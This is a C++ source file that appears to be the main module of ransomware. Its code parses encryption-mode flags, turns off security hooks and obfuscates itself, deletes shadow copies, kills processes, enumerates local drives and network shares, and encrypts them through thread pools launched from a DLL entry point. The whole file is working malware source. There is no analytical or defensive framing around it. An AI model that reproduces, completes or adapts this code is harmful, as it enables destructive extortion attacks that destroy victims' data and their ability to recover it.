#include "common.h"
#include <stdio.h>
#include "api/getapi.h"
#include "obfuscation/MetaString.h"
#include "antihooks/antihooks.h"
#include "global/global_parameters.h"
#include "filesystem/filesystem.h"
#include "threadpool/threadpool.h"
#include "network_scanner/network_scanner.h"
#include "logs/logs.h"
#include "prockiller/prockiller.h"
#include "cryptor.h"
#include "mrph.h"

STATIC std::wstring g_Path;
STATIC BOOL g_NoMutex = FALSE;
STATIC LPWSTR g_CmdLine = NULL;

typedef struct {

	LPCSTR CmdLine;
	INT CmdLineSize;

} DLL_ARGS, *PDLL_ARGS;

STATIC
INT 
SToI(__in char* str) {
	unsigned int strLen = 0;
	unsigned int i = 0;
	while (str[i] != '\0') {
		strLen += 1;
		i++;
	}

	int num = 0;
	int ten;
	BOOL signFlag = TRUE; //true: +, false: -
	for (i = 0; i < strLen; i++) {
		if (str[i] < '0' || str[i] > '9') {
			if (i == 0 && str[i] == '-') {
				signFlag = FALSE;
				continue;
			}
			if (i == 0 && str[i] == '+') {
				signFlag = TRUE;
				continue;
			}

			return 0;
		}

		ten = 1;
		for (unsigned int j = 0; j < strLen - 1 - i; j++) {
			ten *= 10;
		}

		num += ten * (str[i] - '0');
	}

	if (signFlag) {
		return num;
	}
	else {
		return -num;
	}
}

STATIC
LPWSTR
GetCommandLineArg(
	__in LPWSTR* Argv,
	__in INT Argc,
	__in LPCWSTR ArgName
)
{
	if (Argc < 1) {
		return NULL;
	}

	for (INT i = 0; i < Argc; i++) {
		if (!plstrcmpiW(Argv[i], ArgName)) {

			if ((i + 1) < Argc) {
				return Argv[i + 1];
			}

		}
	}

	return NULL;
}

STATIC
BOOL
FindCommandLineArg(
	__in LPWSTR* Argv,
	__in INT Argc,
	__in LPCWSTR ArgName
	)
{
	if (Argc < 1) {
		return FALSE;
	}

	for (INT i = 0; i < Argc; i++) {
		if (!plstrcmpiW(Argv[i], ArgName)) {
			return TRUE;
		}
	}
	
	return FALSE;
}


STATIC
INT
ConvertSizeStr(
	__in LPWSTR SizeStr
	)
{
	INT NeedLength = pWideCharToMultiByte(CP_UTF8, 0, SizeStr, plstrlenW(SizeStr), NULL, 0, NULL, NULL);
	if (!NeedLength) {
		return 0;
	}

	LPSTR Utf8String = (LPSTR)m_malloc(NeedLength + 1);
	if (!Utf8String) {
		return 0;
	}

	pWideCharToMultiByte(CP_UTF8, 0, SizeStr, plstrlenW(SizeStr), Utf8String, NeedLength + 1, NULL, NULL);

	return SToI(Utf8String);
}

STATIC
BOOL
HandleCommandLine(PWSTR CmdLine)
{
	INT Argc = 0;
	LPWSTR* Argv = (LPWSTR*)pCommandLineToArgvW(CmdLine, &Argc);
	if (!Argv) {
		return FALSE;
	}

	LPWSTR Path = GetCommandLineArg(Argv, Argc, OBFW(L"-p"));
	LPWSTR EncryptMode = GetCommandLineArg(Argv, Argc, OBFW(L"-m"));
	LPWSTR LogFile = GetCommandLineArg(Argv, Argc, OBFW(L"-log"));
	LPWSTR Size = GetCommandLineArg(Argv, Argc, OBFW(L"-size"));

	if (FindCommandLineArg(Argv, Argc, OBFW(L"-nomutex"))) {
		g_NoMutex = TRUE;
	}
	else {
		g_NoMutex = FALSE;
	}

	if (EncryptMode) {

		if (!plstrcmpiW(EncryptMode, OBFW(L"all"))) {
			global::SetEncryptMode(ALL_ENCRYPT);
		}
		else if (!plstrcmpiW(EncryptMode, OBFW(L"local"))) {
			global::SetEncryptMode(LOCAL_ENCRYPT);
		}
		else if (!plstrcmpiW(EncryptMode, OBFW(L"net"))) {
			global::SetEncryptMode(NETWORK_ENCRYPT);
		}
		else if (!plstrcmpiW(EncryptMode, OBFW(L"backups"))) {
			global::SetEncryptMode(BACKUPS_ENCRYPT);
		}

	}

	if (Path) {

		global::SetEncryptMode(PATH_ENCRYPT);
		g_Path = Path;

	}

	if (Size) {

		INT iSize = ConvertSizeStr(Size);
		global::SetEncryptSize(iSize);

	}

	if (LogFile) {

		logs::Init(LogFile);

	}

	return TRUE;
}


#ifdef EXE_BUILD

STATIC
DWORD 
WINAPI
CryptorThread(__in LPVOID hModule)
{
	HANDLE hMutex = NULL;
	filesystem::DRIVE_LIST DriveList;
	TAILQ_INIT(&DriveList);

	morphcode();

	if (!getapi::InitializeGetapiModule()) {
		FreeLibraryAndExitThread((HMODULE)hModule, EXIT_FAILURE);
	}

	morphcode();

	DisableHooks();

	morphcode();

#ifndef DEBUG
	if (g_CmdLine) {
		HandleCommandLine((PWSTR)g_CmdLine);
	}
#else



	LPWSTR CmdLine = (LPWSTR)L"C:\\1.exe -nomutex -size 20";

	morphcode(CmdLine);

	HandleCommandLine((PWSTR)CmdLine);

#endif

	if (!g_NoMutex) {

		hMutex = pCreateMutexA(NULL, TRUE, OBFA("jsgjhuuoqozbvjah7ykash288177"));
		if (pWaitForSingleObject(hMutex, 0) != WAIT_OBJECT_0) {

			if (hMutex) {
				pCloseHandle(hMutex);
			}
			FreeLibraryAndExitThread((HMODULE)hModule, EXIT_FAILURE);

		}

	}

	
	if (global::GetEncryptMode() == PATH_ENCRYPT) {

		if (!threadpool::Create(threadpool::LOCAL_THREADPOOL, 1)) {

			if (hMutex) {
				pCloseHandle(hMutex);
			}
			FreeLibraryAndExitThread((HMODULE)hModule, EXIT_FAILURE);

		}

		if (!threadpool::Start(threadpool::LOCAL_THREADPOOL)) {

			if (hMutex) {
				pCloseHandle(hMutex);
			}
			FreeLibraryAndExitThread((HMODULE)hModule, EXIT_FAILURE);

		}


		threadpool::PutTask(threadpool::LOCAL_THREADPOOL, g_Path);
		threadpool::Wait(threadpool::LOCAL_THREADPOOL);
		if (hMutex) {
			pCloseHandle(hMutex);
		}
		FreeLibraryAndExitThread((HMODULE)hModule, EXIT_SUCCESS);

	}

	SYSTEM_INFO SystemInfo;
	pGetNativeSystemInfo(&SystemInfo);

	morphcode(SystemInfo.wProcessorArchitecture);

	SIZE_T ThreadsCountForPool = global::GetEncryptMode() == ALL_ENCRYPT ? SystemInfo.dwNumberOfProcessors : SystemInfo.dwNumberOfProcessors * 2;

	morphcode(ThreadsCountForPool);

	if (global::GetEncryptMode() == ALL_ENCRYPT || global::GetEncryptMode() == LOCAL_ENCRYPT) {

		if (!threadpool::Create(threadpool::LOCAL_THREADPOOL, ThreadsCountForPool)) {

			if (hMutex) {
				pCloseHandle(hMutex);
			}
			FreeLibraryAndExitThread((HMODULE)hModule, EXIT_SUCCESS);

		}

		morphcode(ThreadsCountForPool);

		if (!threadpool::Start(threadpool::LOCAL_THREADPOOL)) {

			if (hMutex) {
				pCloseHandle(hMutex);
			}
			FreeLibraryAndExitThread((HMODULE)hModule, EXIT_SUCCESS);

		}

		morphcode(ThreadsCountForPool);

	}

	if (global::GetEncryptMode() == ALL_ENCRYPT || global::GetEncryptMode() == NETWORK_ENCRYPT) {

		if (!threadpool::Create(threadpool::NETWORK_THREADPOOL, ThreadsCountForPool)) {

			if (hMutex) {
				pCloseHandle(hMutex);
			}
			FreeLibraryAndExitThread((HMODULE)hModule, EXIT_SUCCESS);

		}

		morphcode(ThreadsCountForPool);

		if (!threadpool::Start(threadpool::NETWORK_THREADPOOL)) {

			if (hMutex) {
				pCloseHandle(hMutex);
			}
			FreeLibraryAndExitThread((HMODULE)hModule, EXIT_SUCCESS);

		}

		morphcode(ThreadsCountForPool);

	}

	process_killer::PID_LIST PidList;
	TAILQ_INIT(&PidList);
	process_killer::GetWhiteListProcess(&PidList);
	cryptor::SetWhiteListProcess(&PidList);
	cryptor::DeleteShadowCopies(0);

	if (global::GetEncryptMode() == ALL_ENCRYPT || global::GetEncryptMode() == LOCAL_ENCRYPT) {

		if (filesystem::EnumirateDrives(&DriveList)) {

			morphcode(DriveList.tqh_first);

			filesystem::PDRIVE_INFO DriveInfo = NULL;

			morphcode(DriveInfo);

			TAILQ_FOREACH(DriveInfo, &DriveList, Entries) {

				threadpool::PutTask(threadpool::LOCAL_THREADPOOL, DriveInfo->RootPath);
				morphcode((PCHAR)DriveInfo->RootPath.c_str());

			}

		}

	}

	if (global::GetEncryptMode() == ALL_ENCRYPT || global::GetEncryptMode() == NETWORK_ENCRYPT) {

		network_scanner::StartScan();

	}

	if (threadpool::IsActive(threadpool::LOCAL_THREADPOOL)) {
		threadpool::Wait(threadpool::LOCAL_THREADPOOL);
	}	
	if (threadpool::IsActive(threadpool::NETWORK_THREADPOOL)) {
		threadpool::Wait(threadpool::NETWORK_THREADPOOL);
	}

	if (hMutex) {
		pCloseHandle(hMutex);
	}

	FreeLibraryAndExitThread((HMODULE)hModule, EXIT_SUCCESS);
}

BOOL WINAPI DllMain(
	HINSTANCE hinstDLL,  // handle to DLL module
	DWORD fdwReason,     // reason for calling function
	LPVOID lpReserved
	)  // reserved
{
	PDLL_ARGS DllArgs;
	// Perform actions based on the reason for calling.
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		if (lpReserved) {
			g_CmdLine = (LPWSTR)m_malloc((lstrlenW((LPCWSTR)lpReserved) * sizeof(WCHAR)) + 2);
			if (g_CmdLine) {
				lstrcpyW(g_CmdLine, (LPCWSTR)lpReserved);
			}
		}

		CreateThread(NULL, 0, &CryptorThread, hinstDLL, 0, NULL);
		break;

	case DLL_THREAD_ATTACH:
		// Do thread-specific initialization.
		break;

	case DLL_THREAD_DETACH:
		// Do thread-specific cleanup.
		break;

	case DLL_PROCESS_DETACH:
		// Perform any necessary cleanup.
		break;
	}
	return TRUE;  // Successful DLL_PROCESS_ATTACH.
}

#else


#endif